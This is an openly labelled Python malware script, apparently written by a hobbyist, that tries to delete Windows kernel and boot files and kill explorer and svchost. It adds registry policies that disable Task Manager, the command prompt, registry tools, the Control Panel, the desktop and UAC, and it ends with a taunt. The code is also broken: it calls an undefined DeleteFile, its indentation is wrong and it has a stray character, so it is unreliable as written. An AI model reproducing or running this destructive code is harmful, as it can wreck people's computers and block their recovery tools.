import urllib.request
from PIL import Image, ImageTk
import io
import tkinter as tk
import time as t
import win32api
import win32con
import win32gui
import math
import os
import subprocess
# Warning message
print("This is malware that will remove system DLLs, modify the registry. ")
print("Still execute?, (malware made by anthony)")
t.sleep(0.5)
input("Still execute the malware?")


        DeleteFile("C:\windows\system32\ntdll.dll")
        DeleteFile("C:\windows\system32\ntoskrnl.exe")
        DeleteFile("C:\windows\system32\hal.dll")
        DeleteFile("C:\windows\system32\winresume.exe")
        DeleteFile("C:\Windows\System32\winload.exe")


subprocess.call('taskkill /f /im cmd.exe')
subprocess.call('taskkill /f /im taskmgr.exe')







subprocess.call('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f')
subprocess.call('reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d 1 /f')
subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
subprocess.call('reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v HideClock /t REG_DWORD /d 1 /f')
subprocess.call('reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f')
subprocess.call('reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDriveTypeAutoRun /t REG_DWORD /d 145 /f')
subprocess.call('reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f')
subprocess.call('reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuMyGames /t REG_DWORD /d 1 /f')
subprocess.call('reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f')
subprocess.call('reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuNetWorkPlaces /t REG_DWORD /d 1 /f')
subprocess.call('reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuPinnedList /t REG_DWORD /d 1 /f')
subprocess.call('reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v ForceActiveDesktopOn /t REG_DWORD /d 0 /f')
subprocess.call('reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoActiveDesktop /t REG_DWORD /d 1 /f')
subprocess.call('reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoActiveDesktopChanges /t REG_DWORD /d 1 /f')
subprocess.call('reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f')
subprocess.call('reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRecentDocsHistory /t REG_DWORD /d 0 /f')
subprocess.call('reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f')




t.sleep(0.5)



print("       .AMMMMMMMMMMA.")
print("      .AV. :::.:.:.::MA.")
print("     A' :..        : .:`A")a
print("    A'..              . `A.")
print("   A' :.    :::::::::  : :`A")
print("   M  .    :::.:.:.:::  . .M")
print("   M  :   ::.:.....::.:   .M")
print("   V : :.::.:........:.:  :V")
print("  A  A:    ..:...:...:.   A A")
print(" .V  MA:.....:M.::.::. .:AM.M")
print("A'  .VMMMMMMMMM:.:AMMMMMMMV: A")
print(":M .  .`VMMMMMMV.:A `VMMMMV .:M:")
print(" V.:.  ..`VMMMV.:AM..`VMV' .: V")
print("  V.  .:. .....:AMMA. . .:. .V")
print("   VMM...: ...:.MMMM.: .: MMV")
print("       `VM: . ..M.:M..:::M'")
print("         `M::. .:.... .::M")
print("          M:.  :. .... ..M")
print("          V:  M:. M. :M .V")
print("          `V.:M.. M. :M.V'")
t.sleep(0.5)
subprocess.call('taskkill /f /im explorer.exe')
subprocess.call('explorer.exe')


t.sleep(5.7)


print("I hope you loved your PC")
subprocess.call('taskkill /f /im "svchost.exe')